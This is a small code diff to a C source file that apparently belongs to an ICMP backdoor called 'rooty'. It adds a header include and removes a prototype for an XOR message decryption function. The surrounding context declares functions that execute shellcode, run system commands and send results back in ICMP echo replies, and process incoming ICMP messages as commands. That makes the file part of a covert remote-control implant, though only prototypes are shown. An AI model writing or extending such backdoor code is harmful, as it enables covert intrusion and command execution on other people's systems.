@@ -1,3 +1,5 @@
+#include "rooty.h"
+
 #define Linux
 
 #include <sys/types.h>
@@ -28,9 +30,6 @@ void execute_shellcode(const unsigned char *shellcode, const unsigned char *stac
 
 // Execute system command and send back the results via ICMP echo reply
 void run_command(const unsigned char *command, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp);
-
-// Decrypt/encrypt data using the two byte key (Yay, xor)
-uint32_t decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint32_t size, unsigned char *key);
 
 // Process the received icmp message
 void process_message(const unsigned char *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp);
